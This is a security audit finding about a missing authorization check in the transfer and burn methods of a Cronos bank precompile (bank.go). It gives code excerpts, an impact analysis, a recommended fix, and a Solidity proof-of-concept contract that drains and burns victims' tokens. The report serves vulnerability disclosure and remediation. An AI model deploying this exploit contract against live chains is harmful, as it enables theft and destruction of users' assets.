### Title
Unauthorized Token Transfer via Missing Sender Authorization in Bank Precompile `transfer` Method - (File: `x/cronos/keeper/precompiles/bank.go`)

### Summary
The bank precompile's `transfer` method accepts an arbitrary `sender` address as a calldata argument and moves `evm/<callerContract>` denom tokens from that address without verifying the caller is authorized to spend on behalf of `sender`. Any contract can drain any holder of its own `evm/` denom tokens without the holder's consent.

### Finding Description

In `BankContract.Run`, the `TransferMethodName` case unpacks `sender` directly from ABI-encoded calldata and passes it as the `from` address to `bankKeeper.SendCoins`:

```go
// x/cronos/keeper/precompiles/bank.go:175-192
sender := args[0].(common.Address)
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)
...
from := sdk.AccAddress(sender.Bytes())
to := sdk.AccAddress(recipient.Bytes())
...
denom := EVMDenom(contract.Caller())          // evm/0x<callerContract>
amt := sdk.NewCoin(denom, ...)
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

There is **no check** that `sender == contract.Caller()` and no approval/allowance mechanism. The denom is derived from `contract.Caller()` (line 186), so the calling contract controls which denom is moved, and it can freely specify any `from` address.

The same pattern applies to `BurnMethodName`: the `recipient` argument (the address to burn from) is accepted without verifying it equals `contract.Caller()`:

```go
// x/cronos/keeper/precompiles/bank.go:121-148
recipient := args[0].(common.Address)
...
addr := sdk.AccAddress(recipient.Bytes())
...
denom := EVMDenom(contract.Caller())
...
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, ...)
bc.bankKeeper.BurnCoins(...)
``` [2](#0-1) 

The `exec` helper used by the relayer precompile does enforce `caller == signer`, but the bank precompile does **not** use `exec` and has no equivalent guard: [3](#0-2) 

### Impact Explanation

**Critical**: Unauthorized transfer and burn of `evm/` denom tokens. `evm/<contractAddress>` tokens are the Cosmos-native representation of EVM tokens used in the CRC20/bank precompile system. A malicious contract can:
1. Call `bank.transfer(victimAddress, attackerAddress, amount)` to drain any holder of `evm/<maliciousContract>` tokens.
2. Call `bank.burn(victimAddress, amount)` to destroy any holder's balance of `evm/<maliciousContract>` tokens.

Users who have converted ERC20 tokens to native form via `moveToNative` (as shown in `TestBank.sol`) are directly at risk. This matches the **Critical** impact category: unauthorized transfer/burn of CRC20/precompile-controlled assets. [4](#0-3) 

### Likelihood Explanation

Any unprivileged user can deploy a contract and call the bank precompile at address `0x0000000000000000000000000000000000000064`. The attack requires only that victims hold `evm/<attackerContract>` denom tokens, which is achievable if the attacker deploys a token contract that attracts users (e.g., by appearing legitimate and having users call `moveToNative`). No special privileges, leaked keys, or admin access are required. [5](#0-4) 

### Recommendation

Add an authorization check in both `TransferMethodName` and `BurnMethodName` cases to verify that the `sender`/`recipient` argument equals `contract.Caller()`:

```go
// For transfer:
if sender != contract.Caller() {
    return nil, errors.New("sender is not authenticated")
}

// For burn:
if recipient != contract.Caller() {
    return nil, errors.New("burn target is not authenticated")
}
```

This mirrors the pattern already used in `exec` in `utils.go` where `caller != e.caller` is enforced before executing any native action. [3](#0-2) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function transfer(address, address, uint256) external payable returns (bool);
    function burn(address, uint256) external payable returns (bool);
    function mint(address, uint256) external payable returns (bool);
}

contract MaliciousToken {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: Lure victim into holding evm/<this> tokens
    function lureVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount); // mint evm/<this> to victim
    }

    // Step 2: Drain victim without their consent
    function drain(address victim, address attacker, uint256 amount) external {
        // No authorization check in bank precompile - succeeds
        bank.transfer(victim, attacker, amount);
    }

    // Step 3: Destroy victim's balance
    function destroyBalance(address victim, uint256 amount) external {
        bank.burn(victim, amount);
    }
}
```

1. Attacker deploys `MaliciousToken` at address `0xMalicious`.
2. Attacker calls `lureVictim(victim, 1000)` — victim now holds `evm/0xMalicious` tokens.
3. Attacker calls `drain(victim, attacker, 1000)` — bank precompile executes `SendCoins(victim → attacker)` for denom `evm/0xMalicious` with no authorization check.
4. Victim's balance is drained to zero. [6](#0-5)
